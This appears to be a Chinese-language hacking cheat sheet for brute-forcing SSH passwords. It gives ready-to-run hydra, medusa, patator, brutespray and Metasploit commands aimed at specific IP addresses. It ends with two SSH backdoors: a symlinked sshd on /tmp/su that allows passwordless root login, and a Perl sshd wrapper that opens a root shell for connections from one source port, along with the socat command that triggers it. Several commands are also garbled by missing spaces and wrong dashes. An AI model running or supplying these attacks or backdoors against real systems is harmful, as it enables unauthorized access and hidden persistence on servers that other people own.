# SSH密码暴力破解
## TOOLS
- hydra
```bash
hydra -l root  -P pwd2.dic -t 1 -vV -e ns 192.168.44.139 ssh
hydra -l root  -P pwd2.dic -t 1 -vV -e ns  -o save.log  192.168.44.139  ssh
```
- medusa
```bash
medusa -M ssh -H host.txt -U users.txt -p password
medusa -M ssh -h192.168.157.131 -u root -P /root/newpass.txt -e ns –F
```
- patator
```bash
git clone https://github.com/lanjelot/patator.git
cd patator
python setup.py install
./patator.py ssh_login host=192.168.157.131user=root password=FILE0 0=/root/newpass.txt  #Sigle user
./patator.py ssh_login host=192.168.157.131user=FILE1 1=/root/user.txt password=FILE0 0=/root/newpass.txt #multi user
```
- brutespray
```bash
https://codeload.github.com/x90skysn3k/brutespray/zip/master
apt-get install brutespray #kali installtions
# 手动安装
git clonehttps://github.com/x90skysn3k/brutespray.git
cdbrutespray
pipinstall -r requirements.txt
python brutespray.py --file nmap.xml –i  # nmap.xml 是扫描的程序及版本号nmap  -sV –O 192.168.17.0/24 -oX nmap.xml
python brutespray.py --file 22.xml -U /usr/share/brutespray/wordlist/ssh/user -P/usr/share/brutespray/wordlist/ssh/password --threads 5 --hosts 5 #Use password dictionary
# 指定用户名密码进行破解
pythonbrutespray.py --file 22.xml -u root -p toor --threads 5 --hosts 5
./brutespray.py -f 22.xml -u root -p toor--threads 5 --hosts 5
```
- msf ssh_login module
```bash
shell>$msfconsole
# ssh user enumusers
use auxiliary/scanner/ssh/ssh_enumusers
set rhost 191.168.17.147
set USER_FILE  /root/user
run

# SSH版本扫描
use auxiliary/scanner/ssh/ssh_version
set rhosts x.x.x.x
run

# SSH暴力破解
use auxiliary/scanner/ssh/ssh_login
set rhosts x.x.x.x
set pass_file /usr/share/wordlist/dirb/small.txt
set user_file /usr/share/dict/theHarvester/names_small.txt
run
session -l #查看建立的会话
session -i 1 #切换到会话
```
- SSH后门
```bash
ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=33223; # 软连接后门

# SSH Server wrapper后门
cd /usr/sbin
mv sshd ../bin
vi sshd //加入以下内容并保存
#!/usr/bin/perl
exec"/bin/sh"if(getpeername(STDIN)=~/^..LF/);
exec{"/usr/bin/sshd"}"/usr/sbin/sshd",@ARGV;
chmod 755 sshd
socat STDIOTCP4:target_ip:22,sourceport=19526
```
## 引用
> https://www.freebuf.com/sectool/159488.html
